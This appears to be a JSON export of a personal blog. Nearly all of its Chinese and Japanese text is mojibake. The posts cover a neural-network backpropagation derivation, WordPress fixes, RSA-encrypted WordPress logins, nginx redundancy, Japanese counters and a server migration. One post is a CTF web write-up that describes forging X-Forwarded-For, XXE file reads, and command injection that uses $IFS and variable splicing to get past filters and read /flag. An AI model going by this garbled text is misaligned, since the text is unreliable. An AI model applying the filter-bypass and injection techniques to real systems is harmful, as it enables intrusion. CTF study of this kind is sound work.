æƒæ±‚å’Œå¾—åˆ°çš„è¾“å…¥å€¼ z å’Œå°† z é€šè¿‡ Sigmoid å‡½æ•°ï¼ˆä¹Ÿå³æ˜¯æ¿€æ´»å‡½æ•°ï¼‰éçº¿æ€§è½¬åŒ–åçš„è¾“å‡ºå€¼ aï¼Œä»–ä»¬ä¹‹é—´çš„è®¡ç®—å…¬å¼å¦‚ä¸‹$$z_{i}^{j}=\\sum_{i=1â€¦n}w_{ij}\\cdot a_{ij}^{l-1}-b_{j}^{l} \\qquad (3)\\a_{j}^{l}=f(z_{j}^{(l)})=\\frac{1}{1+e^{-z_{j}^{(l)}}} \\quad (4)$$ å¼å­(3)ï¼Œæ˜¯ä¸æ˜¯å’Œ y = kx + bç±»ä¼¼ï¼Ÿ å…¶å®bå¯ä»¥ç†è§£ä¸ºçº¿æ€§åå·® (è¿™ä¹Ÿæ˜¯å–bä¸ºåçš„åŸå› ï¼Œæ–¹ä¾¿ç†è§£) ç„¶åä»£å…¥åˆ°Sigmoid å‡½æ•°ä¸­åšéçº¿æ€§å˜æ¢ï¼Œåšè¿™ä¸ªå˜æ¢ä¸»è¦æ˜¯å› ä¸ºçº¿æ€§æ¨¡å‹çš„è¡¨è¾¾èƒ½åŠ›ä¸å¤Ÿ(è¯¦æƒ…è¯·æˆ³æˆ‘)ï¼Œå…¶å®è¿™ä¸ªéçº¿æ€§å˜æ¢ä¹Ÿæœ‰å®ƒçš„ç¼ºç‚¹ï¼Œæ¯”å¦‚ æ¢¯åº¦æ¶ˆå¤±ã€ä¸æ˜¯0å‡å€¼ã€ä¸æ˜¯0å‡å€¼ å› ä¸ºè¾“å‡ºå±‚çš„å€¼ä¸çœŸå®çš„å€¼ä¼šå­˜åœ¨è¯¯å·®ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨å‡æ–¹è¯¯å·®æ¥è¡¡é‡é¢„æµ‹å€¼å’ŒçœŸå®å€¼ä¹‹é—´çš„è¯¯å·®ã€‚$$E=\\frac{1}{2}\\sum_{j=1}^{l}(Y_{j}^{k}-a_{j}^{l})^{2} \\qquad (5)$$ å…¶ä¸­ $Y_{j}^{k}$ è¡¨ç¤ºæœŸæœ›è¾“å‡ºï¼Œæ˜¯å·²çŸ¥é‡ è¯¯å·®è‚¯å®šæ˜¯è¶Šå°è¶Šå¥½ã€‚å› æ­¤ï¼Œæˆ‘ä»¬å°±è¦è°ƒæ•´wå’Œbå€¼ï¼Œ ä½¿å¾—è¯¯å·®å‡½æ•°çš„å€¼æœ€å°ã€‚ è¦æ±‚å¼å­(5) åœ¨ä¸¤ä¸ªå˜é‡ ( $\\omega$ å’Œ $b$ ) å–ä¸åŒå€¼æ—¶çš„æœ€å€¼ï¼Œé¦–å…ˆæƒ³åˆ°çš„å°±æ˜¯æ±‚å„è‡ªçš„åå¯¼äº† å¼•å…¥å¼å­(1) å’Œ (4) å¯¹ç›®æ ‡å‡½æ•° E æ±‚ $\\omega$ å’Œ $b$ çš„åå¯¼å¯ä»¥å¾—åˆ° $\\omega$ å’Œ $b$ çš„æ›´æ–°é‡ ä¸‹é¢æ‹¿æ±‚ $\\omega$ åå¯¼æ¥åšæ¨å¯¼ã€‚$$\\Delta \\omega_{ij} = \\eta\\frac{\\partial E}{\\partial w_{hj}} \\qquad (6)$$ $\\eta$ å­¦ä¹ ç‡å–å€¼é€šå¸¸ä¸º 0.1 ~ 0.3,å¯ä»¥ç†è§£ä¸ºæ¯æ¬¡æ¢¯åº¦æ‰€è¿ˆçš„æ­¥ä¼ã€‚ $w_{hj}$ä¸º h å’Œ j ä¸¤å±‚ç¥ç»å…ƒä¹‹é—´çš„æƒé‡ æ³¨æ„åˆ° $w_{hj}$ çš„å€¼å…ˆå½±å“åˆ°ç¬¬ j ä¸ªè¾“å‡ºå±‚ç¥ç»å…ƒçš„è¾“å…¥å€¼ aï¼Œå†å½±å“åˆ°è¾“å‡ºå€¼ y æ ¹æ®é“¾å¼æ±‚å¯¼æ³•å¯¹æƒé‡æ±‚åå¯¼æœ‰ï¼š$$\\frac{\\partial E}{\\partial w_{hj}} =\\frac{\\partial E}{\\partial a_{j}^{l}}\\cdot \\frac{\\partial a_{j}^{l}}{\\partial z_{j}^{l}}\\cdot\\frac{\\partial z_{j}^{l}}{\\partial w_{hj}} \\qquad (7)$$ ç”± (3) æœ‰:$$\\frac{\\partial z_{j}^{l}}{\\partial w_{hj}} = {(\\sum_{i=1â€¦n}w_{hj}\\cdot a_{hj}^{l-1}-b_{j}^{l})}â€™ = a_{hj}^{l-1} = O_{i} \\qquad (8)$$ ä¸ç¥ç»ç½‘ç»œç»“æ„å›¾å¯¹åº”çŸ¥ $ a_{hj}^{l-1} $ ä¸ºä¸Šä¸€å±‚å•å…ƒiçš„è¾“å‡º $ O_{i} $ Sigmoid æ±‚å¯¼çš„å¼å­å¦‚ä¸‹ï¼Œæ±‚å¯¼è¿‡ç¨‹è¯·æˆ³æˆ‘$$f{}â€™(x) = f(x)(1-f(x)) \\qquad (9)$$ç”± (5) å’Œ (9) æœ‰ï¼š$$\\frac{\\partial E}{\\partial a_{j}^{l}}\\cdot \\frac{\\partial a_{j}^{l}}{\\partial z_{j}^{l}} = -\\frac{1}{2}\\cdot 2\\cdot (Y_{j}^{k}-a_{j}^{i})\\cdot \\frac{\\partial a_{j}^{l}}{\\partial z_{j}^{l}}=a_{j}^{l}\\cdot (1-a_{j}^{l})\\cdot (Y_{j}^{k}-a_{j}^{l}) = E_{j} \\qquad (10)$$ å†çœ‹çœ‹å¼å­ (1) å’Œ (2) ä¸­çš„ $E_{j}$ï¼Œè¯¾æœ¬ç»™å‡º å…³äº $ E_{j} $çš„å…¬å¼:$$E_{j} = O_{j}(1-O_{j})(T_{j}-O_{j}) = O_{j}(1-O_{j}))\\sum_{k}w_{jk}E_{k} \\qquad (11)$$ å…¶ä¸­ $ T_{j} $ æ˜¯è¾“å‡ºå•å…ƒ $j$ çš„é¢„æœŸæ˜¯è¾“å‡ºï¼Œ å³å¼å­ (10) ä¸­çš„ $ Y_{j}^{k} $ $ E_{k} $ è¡¨ç¤ºå®ƒè¿æ¥çš„åé¢ä¸€å±‚çš„å•å…ƒ $k$ çš„è¯¯å·®, ç”±æ­¤çœ‹å¼å­ (11) å…¶å®è¿˜æŒºå®¹æ˜“ç†è§£çš„ï¼š$ O_{j}(1-O_{j}) $ è¡¨ç¤º sigmodå‡½æ•°çš„åå¯¼ï¼Œå³è¡¨ç¤ºè°ƒæ•´è¯¯å·®çš„é€Ÿåº¦å³ j å±‚ç¥ç»å…ƒè¯¯å·®æ˜¯é€šè¿‡é¢„æœŸè¾“å‡ºä¸å®é™…è¾“å‡ºçš„å·®å€¼å’Œè°ƒæ•´è¯¯å·®é€Ÿåº¦æ¥è·å–çš„ æ¿€åŠ¨äººå¿ƒçš„æ—¶å€™åˆ°å•¦!! å¼å­ (1)ä¸º: $ \\omega_{ij}=\\omega_{ij} + \\Delta \\omega_{ij} $ å¼å­ (6)ä¸º: $ \\Delta \\omega_{ij} = \\eta\\frac{\\partial E}{\\partial w_{hj}} $ å¼å­ (7)ä¸º: $ \\frac{\\partial E}{\\partial w_{hj}} =\\frac{\\partial E}{\\partial a_{j}^{l}}\\cdot \\frac{\\partial a_{j}^{l}}{\\partial z_{j}^{l}}\\cdot\\frac{\\partial z_{j}^{l}}{\\partial w_{hj}} $ å¼å­ (8) å’Œ (10) åˆ†åˆ«ä¸º: $ \\frac{\\partial z_{j}^{l}}{\\partial w_{hj}} = a_{hj}^{l-1} = O_{i} \\qquad $ $ \\frac{\\partial E}{\\partial a_{j}^{l}}\\cdot \\frac{\\partial a_{j}^{l}}{\\partial z_{j}^{l}} = a_{j}^{l}\\cdot (1-a_{j}^{l})\\cdot (Y_{j}^{k}-a_{j}^{l}) = E_{j} $ å³: $ \\Delta \\omega_{ij} = (\\eta)O_{i}E_{j} $ ç±»ä¼¼ä¹Ÿå¯ä»¥è¯å¾—åç½®é‡å…¬å¼ $ b_{j} = -(\\eta)E_{j} $å¿ƒç´¯,,,ä¸è¿‡æ¨å¯¼å®Œåï¼Œæ„Ÿè§‰è¿˜æŒºå¥½ç©çš„ï¼Œ23333 å‚è€ƒé“¾æ¥ï¼šcsdn: zhiyong_willgithub: edvardHuacsdn: csdnäººå·¥æ™ºèƒ½å¤´æ¡","categories":[{"name":"å­¦æ ¡è¯¾ç¨‹","slug":"å­¦æ ¡è¯¾ç¨‹","permalink":"https://tari.moe/categories/%E5%AD%A6%E6%A0%A1%E8%AF%BE%E7%A8%8B/"}],"tags":[{"name":"å­¦æ ¡è¯¾ç¨‹","slug":"å­¦æ ¡è¯¾ç¨‹","permalink":"https://tari.moe/tags/%E5%AD%A6%E6%A0%A1%E8%AF%BE%E7%A8%8B/"}]},{"title":"wordpress å¸¸è§é—®é¢˜æ±‡æ€»","slug":"wordpress_problem","date":"2019-09-23T08:21:21.000Z","updated":"2021-04-02T02:26:29.144Z","comments":true,"path":"2019/09/23/wordpress_problem/","link":"","permalink":"https://tari.moe/2019/09/23/wordpress_problem/","excerpt":"","text":"wordpresså‡çº§ååå°è®¿é—®ä¸äº†Cannot Modify Header Information â€“ Headers Already Sent Byâ€¦â€¦. è§£å†³åŠæ³•ä¸€ï¼šåœ¨ä¸»é¢˜ç›®å½•ä¸‹functions.phpå¼€å¤´åŠ å…¥ob_start()ï¼› è§£å†³åŠæ³•äºŒï¼šæ‰¾åˆ°sent byåé¢çš„.phpæ–‡ä»¶ï¼Œä¿å­˜ä¸ºUTF-8æ— BOMç¼–ç æ ¼å¼; vim çš„è¯ï¼Œå‘½ä»¤æ¨¡å¼è¾“å…¥ :set nobomb å³å¯è½¬æ¢ä¸ºUTF-8æ— BOMç¼–ç æ ¼å¼ wordpress åå°åª’ä½“åº“ä¸æ˜¾ç¤ºä»¥åŠä¸Šä¼ é”™è¯¯åœ¨&lt;!DOCTYPE&gt; å£°æ˜ä¹‹å‰æœ‰å…¶ä»–çš„ä»£ç å¯¼è‡´æµè§ˆå™¨ä¸èƒ½æ­£ç¡®è¯†åˆ«é¡µé¢çš„æ ‡å‡†ï¼Œæ‰€ä»¥æ‰é€ æˆäº†æŸäº›åŸºäºhtml5çš„ç‰¹æ€§ä¸èƒ½ä½¿ç”¨ã€‚ å‚è€ƒé“¾æ¥ https://www.zmki.cn/1428.html","categories":[{"name":"è¿ç»´","slug":"è¿ç»´","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/"},{"name":"Wordpress","slug":"è¿ç»´/Wordpress","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/Wordpress/"}],"tags":[{"name":"è¿ç»´","slug":"è¿ç»´","permalink":"https://tari.moe/tags/%E8%BF%90%E7%BB%B4/"},{"name":"Wordpress","slug":"Wordpress","permalink":"https://tari.moe/tags/Wordpress/"}]},{"title":"2019å¹´ç¬¬ä¸‰å±Šå¹¿ä¸œçœå¼ºç½‘æ¯ç½‘ç»œå®‰å…¨å¤§èµ›WEBwriteup","slug":"2019qwb","date":"2019-09-10T12:08:00.000Z","updated":"2021-04-04T05:09:44.702Z","comments":true,"path":"2019/09/10/2019qwb/","link":"","permalink":"https://tari.moe/2019/09/10/2019qwb/","excerpt":"","text":"å…«å¦æœ¬æ¬¡æ¯”èµ›çš„ä¸€ä¸ªæ§½ç‚¹ï¼Œä¸ºä»€ä¹ˆæ˜¯åœ¨æ˜ŸæœŸä¸€äºŒä¸¾è¡Œå’§â€¦ ç”±äºæˆ‘åªä¼šä¸€ç‚¹ web ï¼Œæ‰€ä»¥åªè§£å‡ºå‡ é“ web é¢˜ Writeby TARITARI 1. Web â€“ å°æ˜åˆè¢«æ‹’ç»äº†çœ‹åˆ°é¢˜ç›®å¾ˆå®¹æ˜“æƒ³åˆ°æ”¹httpå¤´ï¼Œäºæ˜¯æŠ“åŒ…ã€‚ä¸€å¼€å§‹ç›´æ¥æ”¹cookie: admin=1æ— æ•ˆï¼Œåæ¥æƒ³äº†ä¸‹ï¼Œå°æ˜å¦‚æœæ˜¯æœ¬åœ°äººå°±ä¸ä¼šè¢«æ‹’ç»å•¦ï¼äºæ˜¯ç”¨åˆ°X-Forwarded-Forå­—æ®µï¼Œä¼ªé€ ipä¸ºæœ¬åœ°åœ°å€127.0.0.1ã€‚æäº¤è¿‡å»å‘ç°ä¸æ˜¯adminï¼Œæ”¹å¥½cookieåå³å¯è·å¾—flag{xxasdasdd_for} 2. Web â€“ XXï¼Ÿçœ‹åˆ°é¢˜ç›®å°±æƒ³åˆ°äº†xxeï¼Œå…ˆè®¿é—®ç½‘ç«™å‘ç°ç½‘ç«™çš„æ ‡é¢˜ä¸ºgedit ç„¶åç½‘ä¸Šæœäº†ä¸‹å‘ç°geditåœ¨å†™å®Œæ–‡ä»¶åï¼Œé»˜è®¤ä¼šäº§ç”Ÿä¸€ä¸ªä»¥~ç»“å°¾çš„å¤‡ä»½æ–‡ä»¶åä¾‹å¦‚ï¼šindex.php~ã€‚è¿™å¯ç”¨äºä»æœåŠ¡å™¨ä¸­æå–æºä»£ç /æ–‡ä»¶ã€‚ç„¶åå¾¡å‰‘æ‰«æå‘ç°æœ‰ä¸‰ä¸ªæ–‡ä»¶ï¼Œäºæ˜¯è®¿é—®index.php~å¾—åˆ°æºç ã€‚å“¦è±ï¼Œæœç„¶æ˜¯xxeã€‚ æˆ‘æœ‰ä¸€ä¸ªå¤§èƒ†çš„æƒ³æ³•ï¼Œflag.phpä¼šä¸ä¼šä¹Ÿæœ‰å‘¢ï¼Ÿå¥½å§ï¼Œæ²¡æœ‰ã€‚é‚£æˆ‘ä»¬ç»§ç»­å¤–éƒ¨å®ä½“æ³¨å…¥æ”»å‡»ï¼Œç»“åˆæ‰«æå‡ºæ¥çš„flag.phpï¼Œå¾—åˆ°base64ç¼–ç ã€‚è§£ç å¯å¾—flag{IUyasd8213123123890} 3. å…è´¹çš„,pingä¸€ä¸‹~ç»“åˆé¢˜ç›®å’Œé¡µé¢ï¼Œæ˜¯php pingå‘½ä»¤æ‰§è¡Œæ— è¯¯äº†ï¼Œlsä¸€ä¸‹ï¼Œæœç„¶æ˜¯è¿™æ ·ã€‚ç„¶åå°è¯•lsä¸€ä¸‹æ ¹ç›®å½•ï¼Œå‘ç°wafè¿‡æ»¤æ•æ„Ÿå­—ç¬¦äº†ã€‚äºæ˜¯æµ‹è¯•è¢«è¿‡æ»¤æ‰çš„æ˜¯ç©ºæ ¼è¿˜æ˜¯â€œ/â€œæ–œæ ã€‚ç»“åˆç½‘ä¸Šæœä¸€ä¸‹ï¼Œå¾—çŸ¥ä¸­æœ‰ä¸ªå˜é‡å«IFS(Internal Field Seprator) ,å†…éƒ¨åŸŸåˆ†éš”ç¬¦ï¼Œå³ç©ºæ ¼ã€‚ä»£æ›¿åŸæ¥çš„æˆåŠŸæ‰§è¡Œäº†ã€‚ç»§ç»­lså¾—çŸ¥åŸæ¥æ˜¯ç©ºæ ¼è¢«wafè¿‡æ»¤æ‰äº†ã€‚å˜¿å˜¿ï¼Œé‚£å°±æ˜¯å¯ä»¥cat /flagå•¦ï¼Œæ‰§è¡Œä»¥ä¸‹ï¼Œç„¶åå¾—çŸ¥cat æˆ–flagå…³é”®å­—åˆè¢«è¿‡æ»¤äº†ã€‚ç”±äºæˆ‘å¶å°”ä¼šç¼–å†™shellè„šæœ¬ï¼Œæƒ³åˆ°ç”¨å˜é‡æ‹¼æ¥å¯ä»¥ç»•è¿‡å…³é”®å­—çš„è¿‡æ»¤ã€‚ç„¶åä¸€é¡¿çŒ›å¦‚è™çš„æ“ä½œï¼Œç»“æœè¢«å‘ŠçŸ¥flagä¸åœ¨ç¬¬ä¸€è¡Œã€‚è€Œä¸”ä»–åªèƒ½æ˜¾ç¤ºéƒ¨åˆ†å†…å®¹ã€‚ã€‚ã€‚æœ€åä½¿ç”¨tail -n 1 /flag æˆåŠŸè·å–flag{llllll_U_GeT_Th3_fl4g} 4. phpè®¿é—®é¡µé¢å¾—åˆ°ä¸€ä¸ªapacheçš„æ¬¢è¿é¡µé¢ï¼Œäºæ˜¯ç›´æ¥ç”¨å¾¡å‰‘æ‰«ï¼Œå¾—åˆ°ä¸‰ä¸ªæ–‡ä»¶è®¿é—®index.phpå¾—çŸ¥æœ¬é¢˜ä¸ºæ¡ä»¶ç»•è¿‡å‹é¢˜ç›®ã€‚ç¬¬ä¸€çœ¼çœ‹è¿‡å»æ•´ä¸ªäººå‚»äº†ï¼Œæ— æ•°å­—å­—æ¯è¿˜å¥½è¯´ï¼Œå¯ä»¥ç”¨å¼‚æˆ–^ï¼Œå·¦å³ç§»ç­‰ç­‰å»ç»•è¿‡ã€‚ç„¶åå‘ç°å–åå’Œè‡ªå¢å¯ä»¥ç»•è¿‡ï¼Œä½†æ˜¯é•¿åº¦åªæœ‰27ï¼Œå¤ªè‹›åˆ»äº†ã€‚äºæ˜¯æƒ³åˆ°ï¼Œå¦‚æœè¿™ä¸ªæ˜¯php7ï¼Œé‚£ä¹ˆå°±å¯ä»¥åˆ©ç”¨php7çš„æ–°ç‰¹æ€§ï¼Œå³å¯ä»¥é€šè¿‡($function)();çš„æ–¹å¼åŠ¨æ€æ‰§è¡Œå‡½æ•°ã€‚https://www.php.net/manual/zh/migration70.incompatible.phpå–å~ç¬¦å·å¯ä»¥æŠŠå­—æ¯æ•°å­—ç¬¦å·ç­‰ç­‰å˜ä¸ºä¸å¯è§å­—ç¬¦ï¼Œå°±å¯ä»¥è½»æ¾ç»•è¿‡æ­£åˆ™äº†ï¼Œä¸ºäº†è¢«æˆåŠŸè§£æï¼Œä½¿ç”¨urlencodeä¸€ä¸‹ã€‚ å…ˆcopyä¸‹æ¥ï¼Œæœ¬åœ°æµ‹è¯•ï¼Œæ³¨é‡Šæ‰é”™è¯¯å›æ˜¾ï¼Œæ–¹ä¾¿è°ƒè¯•ã€‚å…ˆè¯•è¯•phpinfoæµ‹è¯•ä¸€ä¸‹ï¼Œé€šè¿‡ echo urlencode(~â€phpinfoâ€)æ„é€ ä¸€ä¸‹ã€‚ åŠ ä¸Š(~exp)(); è¯•è¯•ï¼Œå°±å‘ç°å¯ä»¥åœ¨é¢˜ç›®ç¯å¢ƒä¸­æˆåŠŸæ‰§è¡Œï¼Œæ¥ä¸‹æ¥å°±ç®€å•äº†ã€‚ æ„é€  GetYourFlagè°ƒç”¨GetYouFlag()OKï¼Œæ¥ä¸‹æ¥æœ€åå‘ç°flag{3904c5df2e894ca02a21004feb21e617} åœ¨æºç ä¸­ã€‚","categories":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/categories/ctf/"},{"name":"æ¯”èµ›","slug":"ctf/æ¯”èµ›","permalink":"https://tari.moe/categories/ctf/%E6%AF%94%E8%B5%9B/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/tags/ctf/"},{"name":"æ¯”èµ›","slug":"æ¯”èµ›","permalink":"https://tari.moe/tags/%E6%AF%94%E8%B5%9B/"}]},{"title":"wordpressåå°ç™»å½•å¯†ç å‰ç«¯jsåŠ å¯†+phpåç«¯è§£å¯†","slug":"wordpressåå°ç™»å½•åŠ å¯†","date":"2019-08-26T13:03:23.000Z","updated":"2021-04-02T02:26:16.154Z","comments":true,"path":"2019/08/26/wordpressåå°ç™»å½•åŠ å¯†/","link":"","permalink":"https://tari.moe/2019/08/26/wordpress%E5%90%8E%E5%8F%B0%E7%99%BB%E5%BD%95%E5%8A%A0%E5%AF%86/","excerpt":"","text":"ç”±äºç‰¹æ®ŠåŸå› ï¼Œwordpressåå°ç™»å½•å¯†ç ä¸èƒ½è¢«æ˜æ–‡æŠ“åŒ…â€¦äºæ˜¯æˆ‘é‡‡ç”¨ rsa å‰ç«¯ js åŠ å¯† + php åç«¯è§£å¯† çš„æ–¹å¼è¿›è¡Œ é‚£åªèƒ½å¤§è´¹å‘¨ç« å»æ”¹wordpressä»£ç äº†= = ã€‚ã€‚ã€‚ã€‚ ç”±äº wordpress ç™»å½•æ—¶ wp-login.php æ˜¯ç›´æ¥æäº¤è¡¨å•ç»™è‡ªå·±çš„äºæ˜¯æƒ³åˆ°ç”¨ jquery å»ä¿®æ”¹è¡¨å•æ•°æ®ï¼Œ ç›´æ¥ä¸Šä»£ç ã€‚ wordpressæ ¹ç›®å½• wp-login.php æ–‡ä»¶æ­¤å¤„éœ€è¦ç”¨åˆ°ä¸¤ä¸ªåº“æ–‡ä»¶ jQuery å’Œ jsencryptåœ¨è¡¨å•ä»£ç åé¢çš„ js å¤„ æ·»åŠ  123456789101112131415161718&lt;script type=&quot;text/javascript&quot; src=&quot;./wp-includes/js/jquery/jquery-3.4.1.min.js&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;./wp-includes/js/jsencrypt.min.js&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot;&gt; /* * writeByï¼šTARI * date: 2019/08/26 * usage: $(&quot;#user_pass&quot;).changeæ–¹æ³•å¯¹å¯†ç è¿›è¡Œ rsa å…¬é’¥åŠ å¯†ä¼ è¾“ */ $(&quot;#user_pass&quot;).change(function()&#123;//å¤±å»ç„¦ç‚¹è§¦å‘ï¼Œå°±æ˜¯ç‚¹å‡»ç™»é™†æŒ‰é’®åè§¦å‘ // æ•°æ®å¤„ç† var pubkey = &#x27;ä½ çš„å…¬é’¥&#x27; var encrypt = new JSEncrypt(); encrypt.setPublicKey(pubkey); var encrypted = encrypt.encrypt($(&#x27;#user_pass&#x27;).val()) $(&quot;#user_pass&quot;).val(encrypted); //é‡æ–°èµ‹å€¼ &#125;);&lt;!-- ä¸‹é¢è¿˜æœ‰wp_attempt_focus()ç­‰å‡½æ•°ï¼Œ æˆ–è€…æ–°å»ºä¸€å¯¹ js æ ‡ç­¾ä¹Ÿè¡Œï¼Œä¸è¿‡æˆ‘æ²¡æµ‹è¯•è¿‡ --&gt;&lt;/script&gt; wordpressæ ¹ç›®å½•/wp-includes/pluggable.php æ–‡ä»¶12345678910111213141516function wp_authenticate($username, $password) &#123; $username = sanitize_user($username); $password = trim($password); // è¿™é‡Œåæ·»åŠ å¦‚ä¸‹ä»£ç ï¼š // ç§é’¥ä¸èƒ½å› ä¸ºå¥½çœ‹è€Œæ·»åŠ ä¹±ä¸ƒå…«ç³Ÿçš„ç¼©å‡ä¹‹ç±»çš„ $private_key = &quot;ç§é’¥å†…å®¹&quot;; $decrypt_data = &#x27;&#x27;; // åˆ¤æ–­ç§é’¥æ˜¯å¦æ˜¯å¯ç”¨çš„ï¼Œå¯ç”¨è¿”å›èµ„æºid $pi_key = openssl_pkey_get_private($private_key); // è§£å¯†æ•°æ®, è¿™é‡Œè¦è¿›è¡Œ base64 è§£ç æ˜¯å› ä¸ºæµè§ˆå™¨ä¼šé»˜è®¤å¸®ä½ çš„æ•°æ®è¿›è¡Œç¼–ç  openssl_private_decrypt(base64_decode($password), $decrypt_data, $private_key); $password = $decrypt_data; //ä¸‹é¢ä¸€å †ä»£ç  balabala&#125; å†æŠ“åŒ…å¯†ç å°±æ˜¯åŠ å¯†çŠ¶æ€å•¦ï¼åœ¨ wordpress æ‰¾å¯†ç éªŒè¯çš„å‡½æ•°å’Œæ–‡ä»¶æ‰¾äº†æŒºä¹…çš„â€¦.","categories":[{"name":"å¼€å‘","slug":"å¼€å‘","permalink":"https://tari.moe/categories/%E5%BC%80%E5%8F%91/"},{"name":"Wordpress","slug":"å¼€å‘/Wordpress","permalink":"https://tari.moe/categories/%E5%BC%80%E5%8F%91/Wordpress/"}],"tags":[{"name":"å¼€å‘","slug":"å¼€å‘","permalink":"https://tari.moe/tags/%E5%BC%80%E5%8F%91/"},{"name":"Wordpress","slug":"Wordpress","permalink":"https://tari.moe/tags/Wordpress/"}]},{"title":"nginxåŒå†—ä½™åŠè´Ÿè½½å‡è¡¡æ­å»º","slug":"Redundancy and load balancing","date":"2019-07-28T07:03:22.000Z","updated":"2021-04-02T02:27:38.112Z","comments":true,"path":"2019/07/28/Redundancy and load balancing/","link":"","permalink":"https://tari.moe/2019/07/28/Redundancy%20and%20load%20balancing/","excerpt":"","text":"nginx åŒå†—ä½™nginx å†—ä½™å®‰è£…è„šæœ¬é“¾æ¥é…ç½®æ–‡ä»¶çš„ é“¾æ¥åœ¨æ­¤ **æ³¨æ„äº‹é¡¹** /etc/selinux/configSELINUX=off æ„Ÿè§‰çº¿ä¸Šå’Œçº¿ä¸‹ä¸€ä¸ªæ¯”è¾ƒå¤§çš„åŒºåˆ«å°±åœ¨é˜²ç«å¢™ï¼Œçº¿ä¸‹å¯ä»¥çš„åœ¨è¢«è¿™ä¸ªå¡äº†åŠå¤© 123# eth0 è¯¥å­—æ®µæ ¹æ®ç½‘å¡ç±»å‹æ¥å®šä¹‰firewall-cmd --direct --permanent --add-rule ipv4 filter INPUT 0 --in-interface eth0 --destination 224.0.0.18 --protocol vrrp -j ACCEPTfirewall-cmd --reload è¿™ä¸ªipè½¬å‘ç”¨ä¸ç”¨å°±å¿˜äº†æµ‹è¯•äº†ï¼Œå¦‚æœå¼€å¯é˜²ç«å¢™è¿˜ä¸è¡Œå°±è¯•è¯•å§ã€‚echo â€œnet.ipv4.ip_forward = 1â€ &gt;&gt; /etc/sysctl.conf å¦‚æœæ²¡è£… zlib zlib-devel openssl çš„è®°å¾—å®‰è£…å–”ï¼ *** WARNING - this build will not support IPVS with IPv6. Please install libnl/libnl-3 dev libraries to support IPv6 with IPVS. 1yum -y install libnl libnl-devel nginx è´Ÿè½½å‡è¡¡nginx é…ç½®æ–‡ä»¶å†… upstream yourname &#123; yourip; &#125; location / &#123; proxy_pass http://yourname; &#125;","categories":[{"name":"è¿ç»´","slug":"è¿ç»´","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/"},{"name":"Nginx","slug":"è¿ç»´/Nginx","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/Nginx/"}],"tags":[{"name":"è¿ç»´","slug":"è¿ç»´","permalink":"https://tari.moe/tags/%E8%BF%90%E7%BB%B4/"},{"name":"Nginx","slug":"Nginx","permalink":"https://tari.moe/tags/Nginx/"}]},{"title":"ã€Œé‡è©ã€","slug":"ã€Œé‡è©ã€","date":"2019-07-23T11:33:28.000Z","updated":"2021-04-02T02:13:19.068Z","comments":true,"path":"2019/07/23/ã€Œé‡è©ã€/","link":"","permalink":"https://tari.moe/2019/07/23/%E3%80%8C%E9%87%8F%E8%A9%9E%E3%80%8D/","excerpt":"","text":"- â€“&gt; â€“&gt; - ï¼‘ ã„ã¡ ã‹ ã• ãŸ ã¯ è¡Œ ã„ã£ æšã€å›ã€å°ã€æ­³ ï¼– ã‚ã ã‹ ã• ãŸ ã¯ è¡Œ ã‚ã£ æšã€å›ã€å°ã€æ­³ ï¼˜ ã¯ã¡ ã‹ ã¯ è¡Œ ã¯ã£ æšã€å›ã€å°ã€æ­³ ï¼‘ï¼ ã˜ã‚…ã† ã‹ ã• ãŸ ã¯ è¡Œ ã˜ã‚…ã£ æšã€å›ã€å°ã€æ­³ ä¾‹ï¼šãƒªãƒ³ã‚´ã‚’ä¸‰ã¤è²·ã„ã¾ã—ãŸ&emsp;&emsp;å†™çœŸã‚’3æšæ’®ã‚Šã¾ã—ãŸ&emsp;&emsp;èœœæŸ‘ã‚’ï¼˜ã¤é£Ÿã¹ã¾ã—ãŸ æ˜¨æ—¥ã¯4æ™‚é–“ã—ã‹å¯ã¾ã›ã‚“ã§ã—ãŸã—ã‹ + ã¾ã›ã‚“ã§ã—ãŸ è¦ç¿»è¨³æˆè‚¯å®š [é‡è©] + ã‚‚ å¼·èª¿ [é‡ åš é•· å¤§ å¤š]ã‚±ãƒ¼ã‚­ã‚’8å€‹ã‚‚é£Ÿã¹ã¾ã—ãŸ [é‡è©] + ã—ã‹ å¼·èª¿ [è»½ è–„ çŸ­ å° å°‘]è²¡å¸ƒã«ï¼‘ï¼å…ƒã—ã‹ã‚ã‚Šã¾ã›ã‚“ [é‡è©] ã ã‘ zhiyou~ 10åˆ†ã ã‘ä¼‘ã¿ã¾ã—ã‚‡ã† [é‡è©] ãã‚‰ã„ ~å·¦å³ è²¡å¸ƒã«ï¼‘ï¼å…ƒã(ã)ã‚‰ã„ã‚ã‚Šã¾ã™ [é‡è©] ã¯ zhishao~ è²¡å¸ƒã«ï¼‘ï¼ï¼ï¼å…ƒã¯ã‚ã‚Šã¾ã™","categories":[{"name":"å‹‰å¼·","slug":"å‹‰å¼·","permalink":"https://tari.moe/categories/%E5%8B%89%E5%BC%B7/"}],"tags":[{"name":"å‹‰å¼·","slug":"å‹‰å¼·","permalink":"https://tari.moe/tags/%E5%8B%89%E5%BC%B7/"}]},{"title":"Webç«™ç¾¤ä»Ubuntu14.04è¿ç§»è‡³CentOS7","slug":"ansible-shell","date":"2019-07-15T04:47:50.000Z","updated":"2021-04-02T02:15:12.004Z","comments":true,"path":"2019/07/15/ansible-shell/","link":"","permalink":"https://tari.moe/2019/07/15/ansible-shell/","excerpt":"","text":"nfsè¿ç§» ç³»ç»Ÿç¯å¢ƒ: CentOS-7-x86_64-Minimal-1511ç›¸å…³çš„å‰§æœ¬å’Œè„šæœ¬å¯ä»¥ å‚è€ƒæˆ‘çš„github common.sh ä¸ºå…¬ç”¨è„šæœ¬ï¼ŒåŒ…å«å…¬ç”¨æ¨¡å— æœåŠ¡å™¨å¤‡ä»½1ansible-playbook srvs_backup_role.yml å‡ºç°é—®é¢˜: failed: [192.168.206.132] (item=baseVersionBackup.sh) =&gt; &#123;&quot;changed&quot;: false, &quot;checksum&quot;: &quot;fe2fab79a66b8f5489418fd7b556cdbb74abcac6&quot;, &quot;item&quot;: &quot;baseVersionBackup.sh&quot;, &quot;msg&quot;: 